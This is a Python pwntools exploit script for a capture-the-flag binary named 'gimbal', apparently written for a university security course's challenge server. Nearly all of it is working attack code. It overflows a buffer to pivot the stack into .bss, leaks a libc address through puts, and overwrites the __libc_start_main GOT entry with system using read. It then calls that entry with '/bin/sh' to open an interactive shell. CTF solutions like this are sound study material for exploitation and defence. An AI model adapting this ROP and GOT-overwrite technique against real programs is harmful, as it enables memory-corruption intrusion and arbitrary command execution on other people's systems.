from pwn import *

REMOTE = False

if REMOTE == True:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1344)
    p.recvuntil(":")
    p.sendline("jd3846")
    libc = ELF("libc-2.19.so")
else:
    p = process("./gimbal")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.26.so")

pop_rbp = 0x00000000004005d8 # pop rbp ; ret
pop_rdi = 0x0000000000400793 # pop rdi ; ret
pop_rsi = 0x0000000000400791 # pop rsi ; pop r15 ; ret
pop_rsp = 0x000000000040078d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
bss = 0x601080
puts = 0x400520

e = ELF("./gimbal")

gdb.attach(p)

p.recvuntil('?')

chain = ''

#leak libc (only happens once stack pivots)
chain += p64(bss + 0x1f00) + p64(pop_rdi) + p64(e.symbols['got.__libc_start_main']) + p64(puts)

#setup call to read hence overwriting libc_start_main with system

#read : rdi = 0, rsi = address of where to write (overwrite start_main with system)
chain += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(e.symbols['got.__libc_start_main']) + p64(0) #extra garbage bcs gadget also pops r15
chain += p64(e.symbols['read'])

#setup for system call
binsh = bss + 0x1f00 + 8*13

#after rdi is set, call start_main, which will now have system instead
chain += p64(pop_rdi) + p64(binsh) + p64(e.symbols['__libc_start_main'])
chain += "/bin/sh\x00"

#fgets write ropchain into .bss
p.sendline('A'*0x1f00 + chain)

p.recvuntil('?')
#stack overwrite and pivot
#stack is 0x20
p.sendline('A'*0x20 + p64(bss + 0x1f00) )

#when stack pivots, rop chain makes a puts and read call

#save leak when puts is called
p.recvline()
p.recvline()
leak = p.recvline()[:-1]
addr = u64(leak+'\x00'*(8-len(leak)))

print leak
print hex(addr)

#find addresses
base = addr - libc.symbols['__libc_start_main']
system = base + libc.symbols['system']
print hex(base)

p.sendline(p64(system))

p.interactive()

